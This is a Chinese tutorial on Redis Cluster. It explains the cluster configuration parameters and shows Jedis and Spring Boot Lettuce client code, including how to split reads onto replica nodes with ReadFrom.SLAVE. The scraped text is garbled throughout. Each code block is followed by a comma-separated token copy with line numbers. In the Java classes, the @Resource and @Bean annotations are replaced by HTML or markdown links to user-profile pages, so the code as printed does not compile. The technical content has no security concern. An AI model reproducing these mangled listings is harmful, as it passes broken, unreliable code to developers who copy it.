Cluster在redis.conf文件中引入的配置参数。有些命令的意思是显而易见的，有些命令在你阅读下面的解释后才会更加清晰。,\n,（1）cluster-enabled ：如果想在特定的Redis实例中启用Redis群集支持就设置为yes。 否则，实例通常作为独立实例启动。,\n（2）cluster-config-file ：请注意，尽管有此选项的名称，但这不是用户可编辑的配置文件，而是Redis群集节点每次发生更改时自动保留群集配置（基本上为状态）的文件。,\n（3）cluster-node-timeout ：Redis群集节点可以不可用的最长时间，而不会将其视为失败。 如果主节点超过指定的时间不可达，它将由其从属设备进行故障切换。,\n（4）cluster-slave-validity-factor ：如果设置为0，无论主设备和从设备之间的链路保持断开连接的时间长短，从设备都将尝试故障切换主设备。 如果该值为正值，则计算最大断开时间作为节点超时值乘以此选项提供的系数，如果该节点是从节点，则在主链路断开连接的时间超过指定的超时值时，它不会尝试启动故障切换。,\n（5）cluster-migration-barrier ：主设备将保持连接的最小从设备数量，以便另一个从设备迁移到不受任何从设备覆盖的主设备。有关更多信息，请参阅本教程中有关副本迁移的相应部分。,\n（6）cluster-require-full-coverage ：如果将其设置为yes，则默认情况下，如果key的空间的某个百分比未被任何节点覆盖，则集群停止接受写入。 如果该选项设置为no，则即使只处理关于keys子集的请求，群集仍将提供查询。,\n,以下是最小的Redis集群配置文件：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nport 7000\r\ncluster-enabled yes\r\ncluster-config-file nodes.conf\r\ncluster-node-timeout 5000\r\nappendonly yes,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,port, ,7000,cluster,-,enabled ,yes,cluster,-,config,-,file ,nodes,.,conf,cluster,-,node,-,timeout, ,5000,appendonly ,yes,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,注意：,\n（1）redis-cluster最小配置为三主三从，当1个主故障，大家会给对应的从投票，把从立为主，若没有从数据库可以恢复则redis群集就down了。,\n（2）在这个redis cluster中，如果你要在slave读取数据，那么需要带上readonly指令。redis cluster的核心的理念，主要是用slave做高可用的，每个master挂一两个slave，主要是做数据的热备，当master故障时的作为主备切换，实现高可用的。redis cluster默认是不支持slave节点读或者写的，跟我们手动基于replication搭建的主从架构不一样的。slave node要设置readonly，然后再get，这个时候才能在slave node进行读取。对于redis -cluster主从架构，若要进行读写分离，官方其实是不建议的，但也能做，只是会复杂一些。具体见下面的章节。,\n（3）redis-cluster的架构下，实际上本身master就是可以任意扩展的，你如果要支撑更大的读吞吐量，或者写吞吐量，或者数据量，都可以直接对master进行横向扩展就可以了。也扩容master，跟之前扩容slave进行读写分离，效果是一样的或者说更好。,\n（4）可以使用自带客户端连接：使用redis-cli -c -p cluster中任意一个端口，进行数据获取测试。,\n, ,\n,Java中对redis-cluster数据的一般读取方法简介,\n, ,\n,使用Jedis读写redis-cluster的数据,\n,由于Jedis类一般只能对一台redis-master进行数据操作，所以面对redis-cluster多台master与slave的群集，Jedis类就不能满足了。这个时候我们需要引用另外一个操作类：JedisCluster类。,\n例如我们有6台机器组成的redis-cluster：,\n172.20.52.85:7000、 172.20.52.85:7001、172.20.52.85:7002、172.20.52.85:7003、172.20.52.85:7004、172.20.52.85:7005,\n其中master机器对应端口：7000、7004、7005,\nslave对应端口：7001、7002、7003,\n,使用JedisCluster对redis-cluster进行数据操作的参考代码如下：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n// 添加nodes服务节点到Set集合\r\nSet<HostAndPort> hostAndPortsSet = new HashSet<HostAndPort>();\r\n// 添加节点\r\nhostAndPortsSet.add(new HostAndPort(\"172.20.52.85\", 7000));\r\nhostAndPortsSet.add(new HostAndPort(\"172.20.52.85\", 7001));\r\nhostAndPortsSet.add(new HostAndPort(\"172.20.52.85\", 7002));\r\nhostAndPortsSet.add(new HostAndPort(\"172.20.52.85\", 7003));\r\nhostAndPortsSet.add(new HostAndPort(\"172.20.52.85\", 7004));\r\nhostAndPortsSet.add(new HostAndPort(\"172.20.52.85\", 7005));\r\n\r\n// Jedis连接池配置\r\nJedisPoolConfig jedisPoolConfig = new JedisPoolConfig();\r\njedisPoolConfig.setMaxIdle(100);\r\njedisPoolConfig.setMaxTotal(500);\r\njedisPoolConfig.setMinIdle(0);\r\njedisPoolConfig.setMaxWaitMillis(2000); // 设置2秒\r\njedisPoolConfig.setTestOnBorrow(true);\r\n\r\nJedisCluster jedisCluster = new JedisCluster(hostAndPortsSet ,jedisPoolConfig);\r\nString result = jedisCluster.get(\"event:10\");\r\nSystem.out.println(result);    ,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,// 添加nodes服务节点到Set集合,Set,<,HostAndPort,>, ,hostAndPortsSet, ,=, ,new, ,HashSet,<,HostAndPort,>,(,),;,// 添加节点,hostAndPortsSet,.,add,(,new, ,HostAndPort,(,\"172.20.52.85\",,, ,7000,),),;,hostAndPortsSet,.,add,(,new, ,HostAndPort,(,\"172.20.52.85\",,, ,7001,),),;,hostAndPortsSet,.,add,(,new, ,HostAndPort,(,\"172.20.52.85\",,, ,7002,),),;,hostAndPortsSet,.,add,(,new, ,HostAndPort,(,\"172.20.52.85\",,, ,7003,),),;,hostAndPortsSet,.,add,(,new, ,HostAndPort,(,\"172.20.52.85\",,, ,7004,),),;,hostAndPortsSet,.,add,(,new, ,HostAndPort,(,\"172.20.52.85\",,, ,7005,),),;, ,// Jedis连接池配置,JedisPoolConfig ,jedisPoolConfig, ,=, ,new, ,JedisPoolConfig,(,),;,jedisPoolConfig,.,setMaxIdle,(,100,),;,jedisPoolConfig,.,setMaxTotal,(,500,),;,jedisPoolConfig,.,setMinIdle,(,0,),;,jedisPoolConfig,.,setMaxWaitMillis,(,2000,),;, ,// 设置2秒,jedisPoolConfig,.,setTestOnBorrow,(,true,),;, ,JedisCluster ,jedisCluster, ,=, ,new, ,JedisCluster,(,hostAndPortsSet, ,,,jedisPoolConfig,),;,String, ,result, ,=, ,jedisCluster,.,get,(,\"event:10\",),;,System,.,out,.,println,(,result,),;,    ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,运行结果截图如下图所示：,\n,\n,第一节中我们已经介绍了redis-cluster架构下master提供读写功能，而slave一般只作为对应master机器的数据备份不提供读写。如果我们只在hostAndPortsSet中只配置slave，而不配置master，实际上还是可以读到数据，但其内部操作实际是通过slave重定向到相关的master主机上，然后再将结果获取和输出。,\n,上面是普通项目使用JedisCluster的简单过程，若在spring boot项目中，可以定义JedisConfig类，使用@Configuration、@Value、@Bean等一些列注解完成JedisCluster的配置，然后再注入该JedisCluster到相关service逻辑中引用，这里介绍略。,\n, ,\n,使用Lettuce读写redis-cluster数据,\n,Lettuce 和 Jedis 的定位都是Redis的client。Jedis在实现上是直接连接的redis server，如果在多线程环境下是非线程安全的，这个时候只有使用连接池，为每个Jedis实例增加物理连接，每个线程都去拿自己的 Jedis 实例，当连接数量增多时，物理连接成本就较高了。,\nLettuce的连接是基于Netty的，连接实例（StatefulRedisConnection）可以在多个线程间并发访问，应为StatefulRedisConnection是线程安全的，所以一个连接实例（StatefulRedisConnection）就可以满足多线程环境下的并发访问，当然这个也是可伸缩的设计，一个连接实例不够的情况也可以按需增加连接实例。,\n其中spring boot 2.X版本中，依赖的spring-session-data-redis已经默认替换成Lettuce了。,\n同样，例如我们有6台机器组成的redis-cluster：,\n172.20.52.85:7000、 172.20.52.85:7001、172.20.52.85:7002、172.20.52.85:7003、172.20.52.85:7004、172.20.52.85:7005,\n其中master机器对应端口：7000、7004、7005,\nslave对应端口：7001、7002、7003,\n在spring boot 2.X版本中使用Lettuce操作redis-cluster数据的方法参考如下：,\n（1）pom文件参考如下：,\nparent中指出spring boot的版本，要求2.X以上：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n<parent>\r\n <groupId>org.springframework.boot</groupId>\r\n <artifactId>spring-boot-starter-parent</artifactId>\r\n <version>2.0.4.RELEASE</version>\r\n <relativePath/> <!-- lookup parent from repository -->\r\n</parent>\r\n<!-- lookup parent from repository -->,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,<,parent,>, ,<,groupId,>,org,.,springframework,.,boot,<,/,groupId,>, ,<,artifactId,>,spring,-,boot,-,starter,-,parent,<,/,artifactId,>, ,<,version,>,2.0.4.RELEASE,<,/,version,>, ,<,relativePath,/,>, ,<,!,--, ,lookup ,parent, ,from ,repository, ,--,>,<,/,parent,>,<,!,--, ,lookup ,parent, ,from ,repository, ,--,>,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,依赖中需要加入spring-boot-starter-data-redis，参考如下：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n<dependency>\r\n <groupId>org.springframework.boot</groupId>\r\n <artifactId>spring-boot-starter-data-redis</artifactId>\r\n</dependency>,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,<,dependency,>, ,<,groupId,>,org,.,springframework,.,boot,<,/,groupId,>, ,<,artifactId,>,spring,-,boot,-,starter,-,data,-,redis,<,/,artifactId,>,<,/,dependency,>,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,（2）springboot的配置文件要包含如下内容：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nspring.redis.database=0\r\nspring.redis.lettuce.pool.max-idle=10\r\nspring.redis.lettuce.pool.max-wait=500\r\nspring.redis.cluster.timeout=1000\r\nspring.redis.cluster.max-redirects=3\r\n\r\nspring.redis.cluster.nodes=172.20.52.85:7000,172.20.52.85:7001,172.20.52.85:7002,172.20.52.85:7003,172.20.52.85:7004,172.20.52.85:7005   ,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,spring,.,redis,.,database,=,0,spring,.,redis,.,lettuce,.,pool,.,max,-,idle,=,10,spring,.,redis,.,lettuce,.,pool,.,max,-,wait,=,500,spring,.,redis,.,cluster,.,timeout,=,1000,spring,.,redis,.,cluster,.,max,-,redirects,=,3, ,spring,.,redis,.,cluster,.,nodes,=,172.20.52.85,:,7000,,,172.20.52.85,:,7001,,,172.20.52.85,:,7002,,,172.20.52.85,:,7003,,,172.20.52.85,:,7004,,,172.20.52.85,:,7005,   ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,（3）新建RedisConfiguration类，参考代码如下：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n@Configuration\r\npublic class RedisConfiguration {\r\n [@Resource](https://my.oschina.net/u/929718)\r\n private LettuceConnectionFactory myLettuceConnectionFactory;\r\n\r\n\r\n <a href='http://www.jobbole.com/members/q890462235'>@Bean</a>\r\n public RedisTemplate<String, Serializable> redisTemplate() {\r\n\r\n RedisTemplate<String, Serializable> template = new RedisTemplate<>();\r\n\r\n template.setKeySerializer(new StringRedisSerializer());\r\n\r\n //template.setValueSerializer(new GenericJackson2JsonRedisSerializer());\r\n template.setValueSerializer(new StringRedisSerializer());\r\n\r\n template.setConnectionFactory(myLettuceConnectionFactory);\r\n\r\n return template;\r\n\r\n }\r\n},\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,@,Configuration,public, ,class, ,RedisConfiguration, ,{, ,[,@,Resource,],(,https,:,//my.oschina.net/u/929718), ,private, ,LettuceConnectionFactory ,myLettuceConnectionFactory,;, , , ,<,a, ,href,=,'http://www.jobbole.com/members/q890462235',>,@,Bean,<,/,a,>, ,public, ,RedisTemplate,<,String,,, ,Serializable,>, ,redisTemplate,(,), ,{, , ,RedisTemplate,<,String,,, ,Serializable,>, ,template, ,=, ,new, ,RedisTemplate,<>,(,),;, , ,template,.,setKeySerializer,(,new, ,StringRedisSerializer,(,),),;, , ,//template.setValueSerializer(new GenericJackson2JsonRedisSerializer());, ,template,.,setValueSerializer,(,new, ,StringRedisSerializer,(,),),;, , ,template,.,setConnectionFactory,(,myLettuceConnectionFactory,),;, , ,return, ,template,;, , ,},},\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,（4）新建RedisFactoryConfig类，参考代码如下：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n@Configuration\r\npublic class RedisFactoryConfig {\r\n\r\n @Autowired\r\n private Environment environment;\r\n\r\n\r\n <a href='http://www.jobbole.com/members/q890462235'>@Bean</a>\r\n public RedisConnectionFactory myLettuceConnectionFactory() {\r\n Map<String, Object> source = new HashMap<String, Object>();\r\n\r\n source.put(\"spring.redis.cluster.nodes\", environment.getProperty(\"spring.redis.cluster.nodes\"));\r\n source.put(\"spring.redis.cluster.timeout\", environment.getProperty(\"spring.redis.cluster.timeout\"));\r\n source.put(\"spring.redis.cluster.max-redirects\", environment.getProperty(\"spring.redis.cluster.max-redirects\"));\r\n\r\n RedisClusterConfiguration redisClusterConfiguration;\r\n\r\n redisClusterConfiguration = new RedisClusterConfiguration(new MapPropertySource(\"RedisClusterConfiguration\", source));\r\n\r\n return new LettuceConnectionFactory(redisClusterConfiguration);\r\n\r\n }\r\n},\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,@,Configuration,public, ,class, ,RedisFactoryConfig, ,{, , ,@,Autowired, ,private, ,Environment ,environment,;, , , ,<,a, ,href,=,'http://www.jobbole.com/members/q890462235',>,@,Bean,<,/,a,>, ,public, ,RedisConnectionFactory ,myLettuceConnectionFactory,(,), ,{, ,Map,<,String,,, ,Object,>, ,source, ,=, ,new, ,HashMap,<,String,,, ,Object,>,(,),;, , ,source,.,put,(,\"spring.redis.cluster.nodes\",,, ,environment,.,getProperty,(,\"spring.redis.cluster.nodes\",),),;, ,source,.,put,(,\"spring.redis.cluster.timeout\",,, ,environment,.,getProperty,(,\"spring.redis.cluster.timeout\",),),;, ,source,.,put,(,\"spring.redis.cluster.max-redirects\",,, ,environment,.,getProperty,(,\"spring.redis.cluster.max-redirects\",),),;, , ,RedisClusterConfiguration ,redisClusterConfiguration,;, , ,redisClusterConfiguration, ,=, ,new, ,RedisClusterConfiguration,(,new, ,MapPropertySource,(,\"RedisClusterConfiguration\",,, ,source,),),;, , ,return, ,new, ,LettuceConnectionFactory,(,redisClusterConfiguration,),;, , ,},},\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,（5）在业务类service中注入Lettuce相关的RedisTemplate，进行相关操作。以下是我化简到了springbootstarter中进行，参考代码如下：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n@SpringBootApplication\r\npublic class NewRedisClientApplication {\r\n\r\n    public static void main(String[] args) {\r\n        ApplicationContext context = SpringApplication.run(NewRedisClientApplication.class, args);\r\n        RedisTemplate redisTemplate  = (RedisTemplate)context.getBean(\"redisTemplate\");\r\n        String rtnValue = (String)redisTemplate.opsForValue().get(\"event:10\");\r\n        System.out.println(rtnValue);\r\n\r\n    }\r\n}  ,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,@,SpringBootApplication,public, ,class, ,NewRedisClientApplication, ,{, ,    ,public, ,static, ,void, ,main,(,String,[,], ,args,), ,{,        ,ApplicationContext ,context, ,=, ,SpringApplication,.,run,(,NewRedisClientApplication,.,class,,, ,args,),;,        ,RedisTemplate ,redisTemplate,  ,=, ,(,RedisTemplate,),context,.,getBean,(,\"redisTemplate\",),;,        ,String, ,rtnValue, ,=, ,(,String,),redisTemplate,.,opsForValue,(,),.,get,(,\"event:10\",),;,        ,System,.,out,.,println,(,rtnValue,),;, ,    ,},},  ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,运行结果的截图如下：,\n,\n,以上的介绍，是采用Jedis以及Lettuce对redis-cluster数据的简单读取。Jedis也好，Lettuce也好，其对于redis-cluster架构下的数据的读取，都是默认是按照redis官方对redis-cluster的设计，自动进行重定向到master节点中进行的，哪怕是我们在配置中列出了所有的master节点和slave节点。查阅了Jedis以及Lettuce的github上的源码，默认不支持redis-cluster下的读写分离，可以看出Jedis若要支持redis-cluster架构下的读写分离，需要自己改写和构建多一些包装类，定义好Master和slave节点的逻辑；而Lettuce的源码中，实际上预留了方法（setReadForm(ReadFrom.SLAVE)）进行redis-cluster架构下的读写分离，相对来说修改会简单一些，具体可以参考后面的章节。,\n, ,\n,redis-cluster架构下的读写能力的优化方案,\n,在上面的一些章节中，已经有讲到redis近年来的高可用架构的演变，以及在redis-cluster架构下，官方对redis-master、redis-slave的其实有使用上的建议，即redis-master节点一般用于接收读写，而redis-slave节点则一般只用于备份，其与对应的master拥有相同的slot集合，若某个redis-master意外失效，则再将其对应的slave进行升级为临时redis-master。但如果不介意读取的是redis-cluster中有可能过期的数据并且对写请求不感兴趣时，则亦可通过readonly命令，将slave设置成可读，然后通过slave获取相关的key，达到读写分离。,\n具体可以参阅redis官方文档（https://redis.io/commands/readonly），以下是reids在线文档中，对slave的readonly说明内容：,\n,\n,实际上本身master就是可以任意扩展的，所以如果要支撑更大的读吞吐量，或者写吞吐量，或者数据量，都可以直接对master进行横向水平扩展就可以了。也就是说，扩容master，跟之前扩容slave并进行读写分离，效果是一样的或者说更好。,\n所以下面我们将按照redis-cluster架构下分别进行水平扩展Master，以及在redis-cluster架构下对master、slave进行读写分离两套方案进行讲解。,\n, ,\n,（一）水平扩展Master实例来进行redis-cluster性能的提升,\n,redis官方在线文档以及一些互联网的参考资料都表明，在redis-cluster架构下，实际上不建议做物理的读写分离。那么如果我们真的不做读写分离的话，能否通过简单的方法进行redis-cluster下的性能的提升？我们可以通过master的水平扩展，来横向扩展读写吞吐量，并且能支撑更多的海量数据。,\n对master进行水平扩展有两种方法，一种是单机上面进行master实例的增加（建议每新增一个master，也新增一个对应的slave），另一种是新增机器部署新的master实例（同样建议每新增一个master，也新增一个对应的slave）。当然，我们也可以进行这两种方法的有效结合。,\n,（1）单机上通过多线程建立新redis-master实例，即逻辑上的水平扩展：,\n一般的，对于redis单机，单线程的读吞吐是4w/s~5W/s，写吞吐为2w/s。,\n单机合理开启redis多线程情况下（一般线程数为CPU核数的倍数），总吞吐量会有所上升，但每个线程的平均处理能力会有所下降。例如一个2核CPU，开启2线程的时候，总读吞吐能上升是6W/s~7W/s，即每个线程平均约3W/s再多一些。但过多的redis线程反而会限制了总吞吐量。,\n,（2）扩展更多的机器，部署新redis-master实例，即物理上的水平扩展：,\n例如，我们可以再原来只有3台master的基础上，连入新机器继续新实例的部署，最终水平扩展为6台master（建议每新增一个master，也新增一个对应的slave）。例如之前每台master的处理能力假设是读吞吐5W/s,写吞吐2W/s,扩展前一共的处理能力是：15W/s读，6W/s写。如果我们水平扩展到6台master，读吞吐可以达到总量30W/s，写可以达到12w/s，性能能够成倍增加。,\n,（3）若原本每台部署redis-master实例的机器都性能良好，则可以通过上述两者的结合，进行一个更优的组合。,\n,使用该方案进行redis-cluster性能的提升的优点有：,\n（1）符合redis官方要求和数据的准确性。,\n（2）真正达到更大吞吐量的性能扩展。,\n（3）无需代码的大量更改，只需在配置文件中重新配置新的节点信息。,\n,当然缺点也是有的：,\n（1）需要新增机器，提升性能，即成本会增加。,\n（2）若不新增机器，则需要原来的实例所运行的机器性能较好，能进行以多线程的方式部署新实例。但随着线程的增多，而机器的能力不足以支撑的时候，实际上总体能力会提升不太明显。,\n（3）redis-cluster进行新的水平扩容后，需要对master进行新的hash slot重新分配，这相当于需要重新加载所有的key，并按算法平均分配到各个Master的slot当中。,\n, ,\n,（二）引入Lettuce以及修改相关方法，达到对redis-cluster的读写分离,\n,通过上面的一些章节，我们已经可以了解到Lettuce客户端读取redis的一些操作，使用Lettuce能体现出了简单，安全，高效。实际上，查阅了Lettuce对redis的读写，许多地方都进行了redis的读写分离。但这些都是基于上述redis架构中最普通的主从分离架构下的读写分离，而对于redis-cluster架构下，Lettuce可能是遵循了redis官方的意见，在该架构下，Lettuce在源码中直接设置了只由master上进行读写（具体参见gitHub的Lettuce项目）：,\n,\n,那么如果真的需要让Lettuce改为能够读取redis-cluster的slave，进行读写分离，是否可行？实际上还是可以的。这就需要我们自己在项目中进行二次加工，即不使用spring-boot中的默认Lettuce初始化方法，而是自己去写一个属于自己的Lettuce的新RedisClusterClient的连接，并且对该RedisClusterClient的连接进行一个比较重要的设置，那就是由connection.setReadFrom(ReadFrom.MASTER)改为connection.setReadFrom(ReadFrom.SLAVE)。,\n,下面我们开始对之前章节中的Lettuce读取redis-cluster数据的例子，进行改写，让Lettuce能够支持该架构下的读写分离：,\n,spring boot 2.X版本中，依赖的spring-session-data-redis已经默认替换成Lettuce了。,\n同样，例如我们有6台机器组成的redis-cluster：,\n172.20.52.85:7000、 172.20.52.85:7001、172.20.52.85:7002、172.20.52.85:7003、172.20.52.85:7004、172.20.52.85:7005,\n其中master机器对应端口：7000、7004、7005,\nslave对应端口：7001、7002、7003,\n在spring boot 2.X版本中使用Lettuce操作redis-cluster数据的方法参考如下：,\n（1）pom文件参考如下：,\nparent中指出spring boot的版本，要求2.X以上：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n<parent>\r\n <groupId>org.springframework.boot</groupId>\r\n <artifactId>spring-boot-starter-parent</artifactId>\r\n <version>2.0.4.RELEASE</version>\r\n <relativePath/> <!-- lookup parent from repository -->\r\n</parent>\r\n<!-- lookup parent from repository -->,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,<,parent,>, ,<,groupId,>,org,.,springframework,.,boot,<,/,groupId,>, ,<,artifactId,>,spring,-,boot,-,starter,-,parent,<,/,artifactId,>, ,<,version,>,2.0.4.RELEASE,<,/,version,>, ,<,relativePath,/,>, ,<,!,--, ,lookup ,parent, ,from ,repository, ,--,>,<,/,parent,>,<,!,--, ,lookup ,parent, ,from ,repository, ,--,>,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,依赖中需要加入spring-boot-starter-data-redis，参考如下：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n<dependency>\r\n <groupId>org.springframework.boot</groupId>\r\n <artifactId>spring-boot-starter-data-redis</artifactId>\r\n</dependency>,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,<,dependency,>, ,<,groupId,>,org,.,springframework,.,boot,<,/,groupId,>, ,<,artifactId,>,spring,-,boot,-,starter,-,data,-,redis,<,/,artifactId,>,<,/,dependency,>,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,（2）springboot的配置文件要包含如下内容：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nspring.redis.database=0\r\nspring.redis.lettuce.pool.max-idle=10\r\nspring.redis.lettuce.pool.max-wait=500\r\nspring.redis.cluster.timeout=1000\r\nspring.redis.cluster.max-redirects=3\r\n\r\nspring.redis.cluster.nodes=172.20.52.85:7000,172.20.52.85:7001,172.20.52.85:7002,172.20.52.85:7003,172.20.52.85:7004,172.20.52.85:7005   ,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,spring,.,redis,.,database,=,0,spring,.,redis,.,lettuce,.,pool,.,max,-,idle,=,10,spring,.,redis,.,lettuce,.,pool,.,max,-,wait,=,500,spring,.,redis,.,cluster,.,timeout,=,1000,spring,.,redis,.,cluster,.,max,-,redirects,=,3, ,spring,.,redis,.,cluster,.,nodes,=,172.20.52.85,:,7000,,,172.20.52.85,:,7001,,,172.20.52.85,:,7002,,,172.20.52.85,:,7003,,,172.20.52.85,:,7004,,,172.20.52.85,:,7005,   ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,（3）我们回到RedisConfiguration类中，删除或屏蔽之前的RedisTemplate方法，新增自定义的redisClusterConnection方法，并且设置好读写分离，参考代码如下：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n@Configuration\r\npublic class RedisConfiguration {\r\n\r\n @Autowired\r\n private Environment environment;\r\n\r\n\r\n <a href='http://www.jobbole.com/members/q890462235'>@Bean</a>\r\n public StatefulRedisClusterConnection redisClusterConnection(){\r\n\r\n String strRedisClusterNodes = environment.getProperty(\"spring.redis.cluster.nodes\");\r\n String[] listNodesInfos = strRedisClusterNodes.split(\",\");\r\n\r\n List<RedisURI> listRedisURIs = new ArrayList<RedisURI>();\r\n for(String tmpNodeInfo : listNodesInfos){\r\n String[] tmpInfo = tmpNodeInfo.split(\":\");\r\n listRedisURIs.add(new RedisURI(tmpInfo[0],Integer.parseInt(tmpInfo[1]),Duration.ofDays(10)));\r\n }\r\n\r\n RedisClusterClient clusterClient = RedisClusterClient.create(listRedisURIs);\r\n StatefulRedisClusterConnection<String, String> connection = clusterClient.connect();\r\n connection.setReadFrom(ReadFrom.SLAVE);\r\n\r\n return connection;\r\n }\r\n},\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,@,Configuration,public, ,class, ,RedisConfiguration, ,{, , ,@,Autowired, ,private, ,Environment ,environment,;, , , ,<,a, ,href,=,'http://www.jobbole.com/members/q890462235',>,@,Bean,<,/,a,>, ,public, ,StatefulRedisClusterConnection ,redisClusterConnection,(,),{, , ,String, ,strRedisClusterNodes, ,=, ,environment,.,getProperty,(,\"spring.redis.cluster.nodes\",),;, ,String,[,], ,listNodesInfos, ,=, ,strRedisClusterNodes,.,split,(,\",\",),;, , ,List,<,RedisURI,>, ,listRedisURIs, ,=, ,new, ,ArrayList,<,RedisURI,>,(,),;, ,for,(,String, ,tmpNodeInfo, ,:, ,listNodesInfos,),{, ,String,[,], ,tmpInfo, ,=, ,tmpNodeInfo,.,split,(,\":\",),;, ,listRedisURIs,.,add,(,new, ,RedisURI,(,tmpInfo,[,0,],,,Integer,.,parseInt,(,tmpInfo,[,1,],),,,Duration,.,ofDays,(,10,),),),;, ,}, , ,RedisClusterClient ,clusterClient, ,=, ,RedisClusterClient,.,create,(,listRedisURIs,),;, ,StatefulRedisClusterConnection,<,String,,, ,String,>, ,connection, ,=, ,clusterClient,.,connect,(,),;, ,connection,.,setReadFrom,(,ReadFrom,.,SLAVE,),;, , ,return, ,connection,;, ,},},\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,其中，这三行代码是能进行redis-cluster架构下读写分离的核心：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nRedisClusterClient clusterClient  = RedisClusterClient.create(listRedisURIs);\r\nStatefulRedisClusterConnection<String, String> connection = clusterClient.connect();\r\nconnection.setReadFrom(ReadFrom.SLAVE);  